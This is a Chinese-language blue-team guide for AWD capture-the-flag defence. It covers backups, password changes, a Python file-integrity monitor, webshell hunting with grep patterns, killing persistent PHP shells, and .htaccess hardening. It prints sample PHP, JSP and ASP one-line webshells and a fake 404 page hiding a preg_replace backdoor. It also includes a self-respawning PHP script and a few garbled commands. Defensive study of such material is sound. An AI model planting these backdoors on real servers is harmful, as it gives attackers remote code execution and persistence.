## 网站备份

防止在对源码进行修改时出问题，或者被攻击方删除源码而准备

压缩

    
    
    tar -cvf web.tar /var/www/html
    zip -q -r web.zip /var/www/html
    

解压缩

    
    
    tar -xvf web.tar -c /var/www/html
    unzip web.zip -d /var/www/html
    

备份

    
    
    mv web.tar /tmp
    mv web.zip /home/xxx

上传下载

    
    
    scp username@servername:/path/filename /tmp/local_destination #从服务器下载单个文件到本地
    scp /path/local_filename username@servername:/path  #从本地上传单个文件到服务器
    scp -r username@servername:remote_dir/ /tmp/local_dir #从服务器下载整个目录到本地
    scp -r /tmp/local_dir username@servername:remote_dir #从本地上传整个目录到服务器

SSH

    
    
    Xshell、finalshell

FTP相关工具：

    
    
    FileZilla 、SmartFTP

## 数据库备份

因为最常用的是mysql数据库，所以基本的攻防大部分都是用mysql数据库的命令0

备份指定数据库：

    
    
    mysqldump –u username –p password databasename > target.sql

备份所有数据库：

    
    
    mysqldump –all -databases > all.sql

导入数据库：

    
    
    mysql –u username –p password database < from.sql

## 明确自己手上的机器信息

虽然信息收集都是红队干的活，但是蓝队也需要明确自己的信息

    
    
    uname -a  #系统信息
    ps -aux -ps -ef #进程信息
    id   #用于显示用户ID，以及所属群组ID
    netstat -ano/-a #查看端口情况
    cat /etc/passwd #用户情况
    ls /home/ #用户情况
    find / -type d -perm -002 #可写目录检查
    grep -r “flag” /var/www/html/  #查找flag
    

## 口令更改

为了防范弱口令攻击，mysql密码默认都是root,phpstudy默认密码123456

还有其他默认密码admin，top100， top1000等

**尤其是WEB应用的后台密码修改**

    
    
    passwd username    #ssh口令修改
    set password for mycms@localhost = password('18ciweufhi28746'); #MySQL密码修改
    find /var/www//html -path '*config*’  #查找配置文件中的密码凭证
    

## 监控文件是否被删除或篡改或者被传入恶意文件

python一把锁梭

注意，这是一个python2脚本

    
    
    # -*- coding: utf-8 -*-    #use: python file_check.py ./
    
    import os
    import hashlib
    import shutil
    import ntpath
    import time
    
    
    
    CWD = os.getcwd()
    FILE_MD5_DICT = {}      # 文件MD5字典
    ORIGIN_FILE_LIST = []
    
    # 特殊文件路径字符串
    Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
    bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
    logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
    webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
    difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'
    
    Special_string = 'drops_log'  # 免死金牌
    UNICODE_ENCODING = "utf-8"
    INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"
    
    # 文件路径字典
    spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
    Special_path = {
        'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
        'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
        'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
        'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
    }
    
    def isListLike(value):
        return isinstance(value, (list, tuple, set))
    
    # 获取Unicode编码
    def getUnicode(value, encoding=None, noneToNull=False):
    
        if noneToNull and value is None:
            return None
    
        if isListLike(value):
            value = list(getUnicode(_, encoding, noneToNull) for _ in value)
            return value
    
        if isinstance(value, unicode):
            return value
        elif isinstance(value, basestring):
            while True:
                try:
                    return unicode(value, encoding or UNICODE_ENCODING)
                except UnicodeDecodeError, ex:
                    try:
                        return unicode(value, UNICODE_ENCODING)
                    except:
                        value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
        else:
            try:
                return unicode(value)
            except UnicodeDecodeError:
                return unicode(str(value), errors="ignore")
    
    # 目录创建
    def mkdir_p(path):
        import errno
        try:
            os.makedirs(path)
        except OSError as exc:
            if exc.errno == errno.EEXIST and os.path.isdir(path):
                pass
            else: raise
    
    # 获取当前所有文件路径
    def getfilelist(cwd):
        filelist = []
        for root,subdirs, files in os.walk(cwd):
            for filepath in files:
                originalfile = os.path.join(root, filepath)
                if Special_path_str not in originalfile:
                    filelist.append(originalfile)
        return filelist
    
    # 计算机文件MD5值
    def calcMD5(filepath):
        try:
            with open(filepath,'rb') as f:
                md5obj = hashlib.md5()
                md5obj.update(f.read())
                hash = md5obj.hexdigest()
                return hash
        except Exception, e:
            print u'[!] getmd5_error : ' + getUnicode(filepath)
            print getUnicode(e)
            try:
                ORIGIN_FILE_LIST.remove(filepath)
                FILE_MD5_DICT.pop(filepath, None)
            except KeyError, e:
                pass
    
    # 获取所有文件MD5
    def getfilemd5dict(filelist = []):
        filemd5dict = {}
        for ori_file in filelist:
            if Special_path_str not in ori_file:
                md5 = calcMD5(os.path.realpath(ori_file))
                if md5:
                    filemd5dict[ori_file] = md5
        return filemd5dict
    
    # 备份所有文件
    def backup_file(filelist=[]):
        # if len(os.listdir(Special_path['bak'])) == 0:
        for filepath in filelist:
            if Special_path_str not in filepath:
                shutil.copy2(filepath, Special_path['bak'])
    
    if __name__ == '__main__':
        print u'---------start------------'
        for value in Special_path:
            mkdir_p(Special_path[value])
        # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
        ORIGIN_FILE_LIST = getfilelist(CWD)
        FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
        backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
        print u'[*] pre work end!'
        while True:
            file_list = getfilelist(CWD)
            # 移除新上传文件
            diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
            if len(diff_file_list) != 0:
                # import pdb;pdb.set_trace()
                for filepath in diff_file_list:
                    try:
                        f = open(filepath, 'r').read()
                    except Exception, e:
                        break
                    if Special_string not in f:
                        try:
                            print u'[*] webshell find : ' + getUnicode(filepath)
                            shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                        except Exception as e:
                            print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                        try:
                            f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                            f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                            f.close()
                        except Exception as e:
                            print u'[-] log error : file move error: ' + getUnicode(e)
    
            # 防止任意文件被修改,还原被修改文件
            md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
            for filekey in md5_dict:
                if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                    try:
                        f = open(filekey, 'r').read()
                    except Exception, e:
                        break
                    if Special_string not in f:
                        try:
                            print u'[*] file had be change : ' + getUnicode(filekey)
                            shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                            shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                        except Exception as e:
                            print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                        try:
                            f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                            f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                            f.close()
                        except Exception as e:
                            print u'[-] log error : done_diff: ' + getUnicode(filekey)
                            pass
            time.sleep(2)
            # print '[*] ' + getUnicode(time.ctime())
    

还有github上有脚本

<https://github.com/TheKingOfDuck/FileMonitor>

也可以进行手动的方法

搜索查看可能是攻击方传入的恶意文件

    
    
    find /var/www/html -name *.php -mmin -5 #查看最近5分钟修改文件
    find ./ -name '*.php' | xargs wc -l | sort -u #寻找行数最短文件，一般有可能是一句话木马
    grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    #查包含关键字的php文件
    find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more #在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串"eval("的行。
    #使用more命令来分页显示结果，以便在输出较长时进行逐页查看
    

以下列举三种最常见的webshell

    
    
    <?php @eval($_POST['shell']); ?>
    
    <?php @eval($_REQUESTS['shell']); ?>
    
    
    
    <%Runtime.getRuntime().exec(request.getParameter("shell"));%>
    
    
    
    <%eval request ("shell")%>
    
    <% execute(request("shell")) %>

对于一般留存下来的后门可以利用简单工具

D盾

河马webshell

### 查杀不死马

在红队的主要攻击手段中，不死马是一个十分重要的手段，

作为维持权限的主要手段被使用

常规清除不死马的步骤就是先查看进程

    
    
    ─(root㉿WYP)-[/home/wyp/桌面]
    └─# ps aux | grep root  
    root         1  0.0  0.2  35500  9980 ?        Ss   16:34   0:00 /sbin/init splash
    root         2  0.0  0.0      0     0 ?        S    16:34   0:00 [kthreadd]
    root         3  0.0  0.0      0     0 ?        I<   16:34   0:00 [rcu_gp]
    root         4  0.0  0.0      0     0 ?        I<   16:34   0:00 [rcu_par_gp]
    root         6  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/0:0H-events_highpri]
    root         7  0.0  0.0      0     0 ?        I    16:34   0:00 [kworker/u64:0-flush-8:0]
    root         8  0.0  0.0      0     0 ?        I<   16:34   0:00 [mm_percpu_wq]
    root         9  0.0  0.0      0     0 ?        S    16:34   0:00 [rcu_tasks_kthre]
    root        10  0.0  0.0      0     0 ?        S    16:34   0:00 [rcu_tasks_rude_]
    root        11  0.0  0.0      0     0 ?        S    16:34   0:00 [rcu_tasks_trace]
    root        12  0.0  0.0      0     0 ?        S    16:34   0:00 [ksoftirqd/0]
    root        13  0.0  0.0      0     0 ?        I    16:34   0:00 [rcu_preempt]
    root        14  0.0  0.0      0     0 ?        S    16:34   0:00 [migration/0]
    root        16  0.0  0.0      0     0 ?        S    16:34   0:00 [cpuhp/0]
    root        17  0.0  0.0      0     0 ?        S    16:34   0:00 [kdevtmpfs]
    root        18  0.0  0.0      0     0 ?        I<   16:34   0:00 [netns]
    root        19  0.0  0.0      0     0 ?        I<   16:34   0:00 [inet_frag_wq]
    root        20  0.0  0.0      0     0 ?        S    16:34   0:00 [kauditd]
    root        21  0.0  0.0      0     0 ?        I    16:34   0:00 [kworker/0:2-ata_sff]
    root        22  0.0  0.0      0     0 ?        S    16:34   0:00 [khungtaskd]
    root        23  0.0  0.0      0     0 ?        S    16:34   0:00 [oom_reaper]
    root        24  0.0  0.0      0     0 ?        I<   16:34   0:00 [writeback]
    root        25  0.0  0.0      0     0 ?        S    16:34   0:00 [kcompactd0]
    root        26  0.0  0.0      0     0 ?        SN   16:34   0:00 [ksmd]
    root        27  0.0  0.0      0     0 ?        SN   16:34   0:00 [khugepaged]
    root        28  0.0  0.0      0     0 ?        I<   16:34   0:00 [kintegrityd]
    root        29  0.0  0.0      0     0 ?        I<   16:34   0:00 [kblockd]
    root        30  0.0  0.0      0     0 ?        I<   16:34   0:00 [blkcg_punt_bio]
    root        31  0.0  0.0      0     0 ?        I<   16:34   0:00 [tpm_dev_wq]
    root        32  0.0  0.0      0     0 ?        I<   16:34   0:00 [edac-poller]
    root        33  0.0  0.0      0     0 ?        I<   16:34   0:00 [devfreq_wq]
    root        34  0.1  0.0      0     0 ?        I    16:34   0:01 [kworker/u64:1-flush-8:0]
    root        35  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/0:1H-kblockd]
    root        36  0.0  0.0      0     0 ?        S    16:34   0:00 [kswapd0]

然后直接删除可以进程

也可以利用命令自动进行查找删除

    
    
    ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9

然后重启服务

    
    
    service php-fpm restart

或者写一个`ignore_user_abort(true)`不停反杀不死马的不死马

    
    
    <?php
        ignore_user_abort(true);
        set_time_limit(0);
        unlink(__FILE__);
        $file = 'kill.php';
        $code = '爱咋写咋写';
        while (1){
            file_put_contents($file,$code);
            system('touch -m -d "2018-12-01 09:10:12" kill.php');
              usleep(1000);
        }
    ?>
    

注意usleep要比攻击方设置的值要低

### 经典404/e的preg_replace后门

    
    
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    
    <html><head>
    
    <title>404 Not Found</title>
    
    </head><body>
    
    <h1>Not Found</h1>
    
    <p>The requested URL was not found on this server.</p>
    
    </body></html>
    
    <?php @preg_replace("/[pageerror]/e",$_POST['error'],"saft"); header('HTTP/1.1 404 Not Found');
    
    ?>
    

注意，PHP 5.5.0 版本中，`/e` 修饰符就已经被废弃，并且在 PHP 7.0.0 版本中被移除。7.0.0之后的版本`/e`修饰符就无法使用了

### 查杀后门用户

    
    
    userdel -r username
    //userdel 是用于删除用户的命令，-r 参数表示同时删除与用户关联的文件和目录。username 是要删除的用户的用户名。
    

UID大于500的都是非系统账号，500以下的都为系统保留的账号，使用完全删除账户

## alias欺骗

作为蓝队的我都想说，alias你是真的狗

    
    
    alias cat="flag{this_ls_fakall_flag}"
    

再狗一点

    
    
    alias cat="echo `date`|md5sum|cut -d ' ' -f1||"
    

回复重命名操作

    
    
    unalias -a
    

`unalias -a` 命令只会对当前会话生效，不会对其他会话或永久配置产生影响。如果你希望在每个新会话中都取消别名，可以将该命令添加到配置文件中，例如
`.bashrc` 或 `.bash_profile`。

如果比赛中分配到的权限较低，可以利用alias欺骗

如果拥有较高权限，可以修改一下curl执行权限

    
    
    

## 杀弹shelll

老规矩查看进程

    
    
    ps -ef / px -aux

注意www-data权限的/bin/sh

很有可能是nc

再就是上老一套命令

    
    
    kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'
    

## 端口管理

    
    
    netstat -anp  #查看端口
    firewall-cmd --zone= public --remove-port=80/tcp –permanent #关闭端口
    firewall-cmd –reload #防火墙重启
    

## 提权漏洞

## 漏洞修复

漏洞修复的原则之一就是要站点和对应的功能尽可能不宕机或者不长时间宕机

若无法修复则需要先注释代码，确保页面显示正常再进行删除

若危险函数可能被利用，就直接上die()函数

一些修复技巧参考：<https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/>

## WAF

利用.htaccess配置文件禁止php文件执行

    
    
    <Directory "/var/www/html/upload">   //指定目录后续的指令将应用于该目录
    Options -ExecCGI -Indexes            //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。
    AllowOverride None                   //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。
    RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  
    RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      
    //这两个指令移除指定文件扩展名的处理器和类型。
    //在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。
    php_flag engine off     //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。
    <FilesMatch ".+\.ph(p[3457]?|t|tml)$">
    deny from all
    </FilesMatch>  //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有
    </Directory>
    

